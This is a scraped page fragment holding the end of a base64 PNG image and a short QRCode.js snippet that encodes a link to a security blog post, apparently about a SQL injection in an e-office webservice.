c4jnqSlVyHOqcvOJVVuRvtIq1Gs9RvZJrjfrR5+5Uav1TLdnecZIvz71xLG21nfz5c1Yb0jeyIv5NhCn6nl8KuSiuqg+q0/flT/7yEX7yUe0d3pmurXm5bN6feLMp54+9UT3LdwGYvHC197ANhCnVlMaQ91jmpOL+syL5kV98pnPvJh16mdoz6xRtybz6voyn1yfdYn60ycXx7ptIKO41q+7gW0gTsupeiR1MfP6xKt8+u76rROte4ae2ZrEzGevzFufPrn5GdpP/xluA5k1WfrP3sDhk/rVFM3Pjmne6afPfOrJ0zfj6meYPT2TmHm5va74zKcu2kec6ZVfb0jdwhvF9kn97lOjL6ecPL/HWV5dzDr3U0+f+UI9YmljqItjrtbPej/LZz+5WLUVM+6+hesN8ZbeBKcDqWmN4XnV5GI9AWOoi2Ou1uqJlatQz/0qN4a+QvVaj2EP0VzyWb3+zFsvpk9/5vWd6dOBWLTwZ2/g9kCctugxc8pyceZTt5+Yder6RX1nmB65aE32VtcnqovWJepPnPlSL357ILnJ4v/PDRwGUlMaw219OkQ9mZebv/Kbzzp5on77j5jeMVdr87WusJe6WLmKzJdWoc/8DPWJ+uRneBjImWlpP3cDh0/qbj2bZj0hFZkvrSLrS6tIv77KVchnWJ4xznxjvtazPdXLU5H80btX5anQ1+rH9j8CVe4sPuJLj33OcL0hcWmvptsn9ZzW7GD6zDv15Orp1zdD/dbrU0+uPqKe7KEuWjPj6mL2m9Wri9YnVx9xvSHjbbzBevsZ4vTvomd36onms5+6aJ1cvzzz6qL+QjUxa8tzFvrNWSc3ry6qJ2ad+dTlI643xNt6E9wG4tSvcHZup5x5+6WuX8x88pnP/oVXNeU5C3ubk9svdfOiPlG/XExdPuI2EIsWvvYGDgNx6omzY+ozf8V9GvTLRfXEzLvPGd6t1Wdve6mLM928qC/RvPgsfxiIRQtfcwN/fSA+bX47yX06Ur/yW6dPtE/hmVZ61pZWkfqsvrwVV/nyjKE/cfTU2nMU/vWB5OaLf+0G/tpAatIVNeUKj1HrCrlYWsWMq1fPZ1E9DGvkYuryGc7qPId50T5yUT3r1NNX+l8bSDVb8ec3cBiI00ycbaXPacuv0H7WyRPNi+blZ/voOcuVlvlZr5kv9RlXn2GdpWLMHwYyJtf6529gG4hPyRXePaJ99CdXF+tJqUheWoW6fUqrkBfquYtVU1F9Kmr9LLKv3tSrV4V6+uSivsJtIEVWvP4G1kBeP4PdCf4FAAD//3G38lkAAAAGSURBVAMA4r8o1Nj145cAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-dept-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 